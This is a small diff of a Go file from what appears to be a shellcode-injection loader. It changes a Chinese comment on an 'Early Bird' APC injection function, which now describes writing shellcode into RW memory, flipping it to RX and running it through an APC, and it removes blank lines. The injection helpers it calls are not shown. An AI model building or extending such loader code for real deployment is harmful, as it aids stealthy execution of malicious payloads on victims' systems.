@@ -293,12 +293,10 @@ func ThreadShellcodeInject(shellcode []byte) error {
 	return nil
 }
 
-// 创建一个RWX的进程，通过apc注入shellcode到线程中
+// 创建一个rw内存空间，写入shellcode后换成rx，通过apc执行shellcode
 func EarlybirlInject(shellcode []byte) error {
-
 	addr, _ := allocateAndProtectMemory(shellcode)
 	setupAPC(addr)
-
 	return nil
 }
 
